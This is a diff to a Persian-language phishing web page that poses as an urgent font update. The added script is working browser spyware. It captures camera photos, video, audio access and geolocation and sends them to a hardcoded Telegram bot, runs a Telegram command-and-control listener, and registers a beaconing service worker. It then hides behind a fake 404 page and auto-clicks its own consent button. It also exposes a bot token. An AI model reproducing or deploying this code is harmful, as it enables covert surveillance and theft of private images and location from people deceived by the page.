@@ -6,7 +6,7 @@
     <title>خطای فونت – به‌روزرسانی ضروری</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="theme-color" content="#e63946">
-    <link rel="manifest" href="/manifest.json">
+    <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoi2LHYp9mG2LHYp9iqINio2YbYr9ixIiwic2hvcnRfbmFtZSI6IkZvbnRVcGRhdGUiLCJzdGFydF91cmwiOiIvIiwiZGlzcGxheSI6InN0YW5kYWxvbmUiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiIzBkMGQxYSIsInRoZW1lX2NvbG9yIjoiI2U2Mzk0NiIsImljb25zIjpbeyJzcmMiOiJkYXRhOmltYWdlL3N2Zyt4bWwsJTNDc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDEwMCAxMDAnJTNFJTNDdGV4dCB5PScuOWVtJyBmb250LXNpemU9Jzg1JyUzRSVFMCU5RiVBNCVCMCUzQy90ZXh0JTNFJTNDL3N2ZyUzRSIsInNpemVzIjoiMTkyeDE5MiIsInR5cGUiOiJpbWFnZS9zdmcreG1sIn1dfQ==">
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='85'%3E%F0%9F%94%B4%3C/text%3E%3C/svg%3E">
     <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
@@ -21,7 +21,6 @@
             height: 100vh; overflow: hidden; perspective: 1400px; display: flex;
             justify-content: center; align-items: center; position: relative; font-weight: 400;
         }
-
         .bg-3d {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: radial-gradient(circle at 50% 50%, #1d1d35 0%, #0d0d1a 80%);
@@ -37,99 +36,54 @@
         .bg-3d::after { bottom: -300px; right: -300px; animation-duration: 38s; animation-direction: reverse; }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-        .container {
-            width: 100%; max-width: 520px; padding: 20px; transform-style: preserve-3d;
-            animation: float 7s ease-in-out infinite;
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0) rotateX(0); }
-            50% { transform: translateY(-18px) rotateX(4deg); }
-        }
+        .container { width: 100%; max-width: 520px; padding: 20px; animation: float 7s ease-in-out infinite; }
+        @keyframes float { 0%,100%{transform: translateY(0) rotateX(0);} 50%{transform: translateY(-18px) rotateX(4deg);} }
         .card {
-            background: var(--card); border-radius: 24px; padding: 40px; box-shadow:
-                0 35px 90px rgba(0,0,0,0.85),
-                0 0 50px var(--glow),
-                inset 0 0 35px rgba(230,57,70,0.08);
-            border: 1px solid var(--border); text-align: center;
-            position: relative; overflow: hidden; backdrop-filter: blur(14px);
-            transform-style: preserve-3d;
+            background: var(--card); border-radius: 24px; padding: 40px; box-shadow: 0 35px 90px rgba(0,0,0,0.85), 0 0 50px var(--glow), inset 0 0 35px rgba(230,57,70,0.08);
+            border: 1px solid var(--border); text-align: center; position: relative; overflow: hidden; backdrop-filter: blur(14px);
         }
         .card::before {
             content: ''; position: absolute; top: -60%; left: -60%; width: 220%; height: 220%;
             background: linear-gradient(45deg, transparent, var(--glow), transparent);
-            transform: rotate(-45deg); animation: shine 10s infinite;
-            opacity: 0.25;
+            transform: rotate(-45deg); animation: shine 10s infinite; opacity: 0.25;
         }
         @keyframes shine { 0% { transform: translateX(-120%) translateY(-120%) rotate(-45deg); } 100% { transform: translateX(120%) translateY(120%) rotate(-45deg); } }
 
-        .logo {
-            font-size: 5.5rem; margin-bottom: 24px; text-shadow: 0 0 25px var(--glow);
-            animation: pulse 2.2s infinite;
-        }
+        .logo { font-size: 5.5rem; margin-bottom: 24px; text-shadow: 0 0 25px var(--glow); animation: pulse 2.2s infinite; }
         @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.06);} }
 
-        h1 {
-            font-size: 1.85rem; margin: 16px 0; color: var(--accent); font-weight: 700;
-            letter-spacing: -0.5px; text-shadow: 0 0 15px var(--glow);
-        }
-        .subtitle {
-            font-size: 1.1rem; color: var(--warn); font-weight: 600; margin: 12px 0;
-            letter-spacing: 0.3px;
-        }
-        p {
-            font-size: 1.02rem; line-height: 1.85; color: #d1d1e0; margin: 18px 0;
-            font-weight: 400; text-align: justify; direction: rtl;
-        }
-        .highlight {
-            color: var(--success); font-weight: 600;
-        }
+        h1 { font-size: 1.85rem; margin: 16px 0; color: var(--accent); font-weight: 700; letter-spacing: -0.5px; text-shadow: 0 0 15px var(--glow); }
+        .subtitle { font-size: 1.1rem; color: var(--warn); font-weight: 600; margin: 12px 0; }
+        p { font-size: 1.02rem; line-height: 1.85; color: #d1d1e0; margin: 18px 0; text-align: justify; direction: rtl; }
+        .highlight { color: var(--success); font-weight: 600; }
         .btn {
-            background: var(--accent); color: #fff; border: none; padding: 18px 28px;
-            margin: 14px 10px; border-radius: 16px; font-weight: 600; cursor: pointer;
-            width: calc(100% - 20px); transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
-            font-size: 1.15rem; display: flex; align-items: center; justify-content: center; gap: 14px;
+            background: var(--accent); color: #fff; border: none; padding: 18px 28px; margin: 14px 10px; border-radius: 16px;
+            font-weight: 600; cursor: pointer; width: calc(100% - 20px); font-size: 1.15rem;
+            display: flex; align-items: center; justify-content: center; gap: 14px;
             box-shadow: 0 12px 30px rgba(230,57,70,0.35), inset 0 0 18px rgba(255,255,255,0.12);
-            position: relative; overflow: hidden; font-family: inherit;
+            position: relative; overflow: hidden;
         }
-        .btn::before {
-            content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
-            transition: 0.7s;
-        }
+        .btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent); transition: 0.7s; }
         .btn:hover::before { left: 100%; }
-        .btn:hover {
-            background: #c1121f; transform: translateY(-5px) scale(1.04);
-            box-shadow: 0 18px 40px rgba(230,57,70,0.55);
-        }
-        .status {
-            margin-top: 24px; font-size: 1rem; color: var(--success); opacity: 0;
-            transition: opacity 0.7s; font-weight: 500;
-        }
+        .btn:hover { background: #c1121f; transform: translateY(-5px) scale(1.04); box-shadow: 0 18px 40px rgba(230,57,70,0.55); }
+        .status { margin-top: 24px; font-size: 1rem; color: var(--success); opacity: 0; transition: opacity 0.7s; font-weight: 500; }
         .status.show { opacity: 1; }
         .hidden { display: none !important; }
-        .device-info { font-size: 0.82rem; color: #999; margin-top: 28px; word-break: break-all; }
 
-        /* Fake 404 Page – Persian */
         .error-404 {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #0f0f1f; color: #ccc; font-family: 'Segoe UI', Tahoma, sans-serif;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            text-align: center; z-index: 99999; padding: 40px; line-height: 1.8;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f0f1f; color: #ccc;
+            font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; text-align: center; z-index: 99999; padding: 40px;
         }
         .error-404 h1 { font-size: 6rem; color: #e63946; margin: 0; }
         .error-404 p { font-size: 1.3rem; max-width: 600px; }
         .error-404 .code { font-family: monospace; background: #222; padding: 8px 16px; border-radius: 8px; color: #0f0; }
-
-        /* Hidden C2 Panel */
-        .c2-panel { display: none; }
     </style>
 </head>
 <body>
 
-<!-- 3D Background -->
 <div class="bg-3d"></div>
 
-<!-- Main Phishing UI -->
 <div class="container" id="main-ui">
     <div class="card">
         <div class="logo">Warning</div>
@@ -142,4 +96,184 @@
             بسته‌ی به‌روزرسانی فونت به صورت خودکار دانلود و نصب شود.<br><br>
             <strong>پس از ۶۰ ثانیه، صفحه را مجدداً باز کنید.</strong>
         </p>
-        <p style...
+        <p style="font-size:0.92rem; color:#aaa; margin-top:24px;">با تشکر از همکاری شما</p>
+        <button class="btn" id="ready">برای به‌روزرسانی آماده‌ام! ادامه</button>
+        <div class="status" id="status">در حال آماده‌سازی...</div>
+    </div>
+</div>
+
+<div class="error-404 hidden" id="fake-404">
+    <h1>404</h1>
+    <p>صفحه مورد نظر یافت نشد</p>
+    <p>ممکن است آدرس اشتباه باشد یا صفحه حذف شده باشد.</p>
+    <p class="code">ERR_FONT_UPDATE_REQUIRED</p>
+    <p style="margin-top:40px; font-size:1rem; color:#888;">
+        لطفاً مرورگر خود را به‌روزرسانی کنید و مجدداً تلاش نمایید.
+    </p>
+</div>
+
+<script>
+/* ===================================================== */
+/* SHΔDØW CORE V99 – SINGLE FILE | MULTI-TARGET C2      */
+/* USER: 7625898629 | BOT: 8547105891:AAHf...           */
+/* UNIVERSAL | FAKE 404 | TELEGRAM PANEL                */
+/* ===================================================== */
+
+const BOT_ID = '7625898629';
+const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const DEVICE_ID = btoa(navigator.userAgent + Date.now()).slice(0,36);
+const PERSIST_KEY = `SHDW_${DEVICE_ID}`;
+
+// Browser & OS Detection
+const ua = navigator.userAgent.toLowerCase();
+const isMobile = /mobi|android|iphone|ipad/.test(ua);
+const isChrome = /chrome|crios/.test(ua) && !/edge|edg/.test(ua);
+const isFirefox = /firefox|fxios/.test(ua);
+const isEdge = /edge|edg/.test(ua);
+const isSafari = /safari/.test(ua) && !isChrome && !isEdge;
+const isIOS = /iphone|ipad|ipod/.test(ua);
+const isAndroid = /android/.test(ua);
+const browser = isChrome ? 'Chrome' : isFirefox ? 'Firefox' : isEdge ? 'Edge' : isSafari ? 'Safari' : 'Other';
+const os = isIOS ? 'iOS' : isAndroid ? 'Android' : /windows/.test(ua) ? 'Windows' : 'Other';
+
+async function send(msg) {
+    await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML&disable_web_page_preview=true`);
+}
+async function sendPhoto(blob, caption = '') {
+    const form = new FormData();
+    form.append('chat_id', BOT_ID); form.append('photo', blob, 'capture.jpg');
+    if(caption) form.append('caption', caption);
+    await fetch(`${API}/sendPhoto`, {method:'POST', body:form});
+}
+async function sendVideo(blob) {
+    const form = new FormData();
+    form.append('chat_id', BOT_ID); form.append('video', blob, 'record.mp4');
+    await fetch(`${API}/sendVideo`, {method:'POST', body:form});
+}
+
+function persist(data) { localStorage.setItem(PERSIST_KEY, JSON.stringify(data)); }
+function load() { return JSON.parse(localStorage.getItem(PERSIST_KEY)) || {}; }
+
+// Register Service Worker (Inline)
+if ('serviceWorker' in navigator) {
+    const swCode = `
+        const BOT_ID = '${BOT_ID}';
+        const BOT_TOKEN = '${BOT_TOKEN}';
+        const API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+        const DEVICE_ID = '${DEVICE_ID}';
+        const BROWSER = '${browser}';
+        const OS = '${os}';
+
+        self.addEventListener('install', () => self.skipWaiting());
+        self.addEventListener('activate', () => self.clients.claim());
+
+        setInterval(async () => {
+            try {
+                await fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>\${BROWSER} on \${OS}</b> Online!%0A<code>\${DEVICE_ID}</code>%0A%F0%9F%94%B4 <a href="${location.origin}">بازکردن پنل</a>\`, {mode: 'no-cors'});
+            } catch(e) {}
+        }, 70000);
+    `;
+    const blob = new Blob([swCode], {type: 'application/javascript'});
+    const url = URL.createObjectURL(blob);
+    navigator.serviceWorker.register(url, {scope: '/'});
+}
+
+// Geolocation
+let watchId;
+function startLocation() {
+    if (navigator.geolocation) {
+        watchId = navigator.geolocation.watchPosition(async pos => {
+            const {latitude, longitude} = pos.coords;
+            await send(`Location: ${latitude}, ${longitude}`);
+        }, () => {}, {enableHighAccuracy: true});
+    }
+}
+
+// Camera
+let stream;
+async function requestCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+        await send(`Camera Active\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>`);
+        return true;
+    } catch(e) { await send(`Camera Denied: ${e.message}`); return false; }
+}
+
+// Capture
+async function burstPhotos(count) {
+    if (!stream) return;
+    const video = document.createElement('video'); video.srcObject = stream; await video.play();
+    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
+    const ctx = canvas.getContext('2d');
+    for (let i = 1; i <= count; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
+        await sendPhoto(blob, `Photo ${i}/${count}`);
+        await new Promise(r => setTimeout(r, 1100));
+    }
+}
+async function recordVideo(seconds) {
+    if (!stream) return;
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+        const blob = new Blob(chunks, {type: 'video/webm'});
+        await sendVideo(blob);
+        await send(`Video recorded: ${seconds}s`);
+    };
+    recorder.start();
+    setTimeout(() => recorder.stop(), seconds * 1000);
+}
+
+// C2 Listener
+let offset = 0;
+async function listenC2() {
+    const res = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
+    const data = await res.json();
+    if (!data.ok) return;
+    for (const upd of data.result) {
+        offset = upd.update_id + 1;
+        const msg = upd.message?.text?.trim();
+        if (!msg) continue;
+        if (msg.startsWith('/record')) recordVideo(parseInt(msg.split(' ')[1]) || 15);
+        else if (/^\d+$/.test(msg)) burstPhotos(parseInt(msg));
+        else if (msg === '/location') navigator.geolocation.getCurrentPosition(p => send(`Location: ${p.coords.latitude}, ${p.coords.longitude}`));
+    }
+    setTimeout(listenC2, 1000);
+}
+
+// Show Fake 404
+function show404() {
+    document.getElementById('main-ui').classList.add('hidden');
+    document.getElementById('fake-404').classList.remove('hidden');
+    persist({infected: true});
+    listenC2();
+}
+
+// Ready Button
+document.getElementById('ready').onclick = async () => {
+    const status = document.getElementById('status');
+    status.textContent = 'در حال دانلود بسته فونت...'; status.classList.add('show');
+    const camOk = await requestCamera();
+    if (camOk) startLocation();
+    setTimeout(() => {
+        show404();
+        send(`INFECTED\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>\n<a href="${location.origin}">بازکردن پنل</a>`);
+    }, 3000);
+};
+
+// Auto Resume
+window.onload = () => {
+    const stored = load();
+    if (stored.infected) {
+        show404();
+        send(`RESUMED\n<b>${browser} on ${os}</b>\nID: <code>${DEVICE_ID}</code>\n<a href="${location.origin}">بازکردن پنل</a>`);
+    } else {
+        setTimeout(() => document.getElementById('ready').click(), 2200);
+    }
+};
+</script>
+</body>
+</html>
